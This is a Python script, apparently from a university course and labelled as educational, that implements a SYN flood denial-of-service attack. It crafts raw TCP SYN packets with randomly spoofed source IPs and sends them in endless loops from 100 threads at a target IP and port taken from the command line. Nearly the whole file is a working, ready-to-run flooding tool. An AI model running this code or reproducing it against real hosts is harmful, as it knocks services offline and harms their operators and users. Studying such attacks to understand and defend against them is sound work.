'''
Código desenvolvidos com propósito exclusivamente educacional.
Baseado/adaptado do código de: https://github.com/Leeon123/Simple-SYN-Flood


UNIFESP - Igor Ribeiro 
'''

import socket, sys, threading, random
from struct import *
from requests import *

#verifica se o usuário digitou o ip e a porta
if len(sys.argv)!=3:
    print("Execute: python synflood.py <ip> <porta>")
    sys.exit()

#função para calcular o checksum
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w
    
    s = (s>>16) + (s & 0xffff);
    s = ~s & 0xffff
    
    return s

#criação do socket raw
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error.msg:
    print ('Falha ao criar socket ' + str(msg[0]) +' erro: ' + msg[1])
    sys.exit()
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

#gera um ip aleatório como src, usa o up digitado pelo usuário como dest
dest_ip = socket.gethostbyname(str(sys.argv[1]))

#headedr e modelo do tcp do código citado no começo do arquivo

def header(source_ip):
  source_ip = ip = '{}.{}.{}.{}'.format(*__import__('random').sample(range(0,255),4))
  ihl = 5
  version = 4
  tos = 0
  tot_len = 20 + 20
  id = random.randint(1,65535)
  frag_off = 0
  ttl = random.randint(1,255)
  protocol = socket.IPPROTO_TCP
  check = 10 
  saddr =socket.inet_aton ( source_ip )
  daddr = socket.inet_aton ( dest_ip )
  ihl_version = (version << 4) + ihl
  global ip_header
  ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

def tcp(source_ip):
  header(source_ip)
  source = random.randint(36000, 65535)
  dest = int(sys.argv[2])
  seq = 0
  ack_seq = 0
  doff = 5
  fin = 0
  syn = 1
  rst = 0
  psh = 0
  ack = 0
  urg = 0
  window = socket.htons (5840)
  check = 0
  urg_ptr = 0
  offset_res = (doff << 4) + 0
  tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) +(ack << 4) + (urg << 5)
  tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
  source_address = socket.inet_aton( source_ip )
  dest_address = socket.inet_aton(dest_ip)
  placeholder = 0
  protocol = socket.IPPROTO_TCP
  tcp_length = len(tcp_header)
  psh = pack('!4s4sBBH', source_address , dest_address , placeholder , protocol , tcp_length);
  psh = psh + tcp_header;
  tcp_checksum = checksum(psh)
  tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
  global packet
  packet = ip_header + tcp_header

def run(index):
  while True:
    source_ip = ip = '{}.{}.{}.{}'.format(*__import__('random').sample(range(0,255),4))
    tcp(source_ip)
    s.sendto(packet, (dest_ip , 0))
    print ('[',index,']: ',source_ip),

#paralelismo: multiplas threads abrindo conexões mas nunca fechando
if __name__ == "__main__":
    for index in range(100):
        x = threading.Thread(target=run, args=(index,))
        x.start()
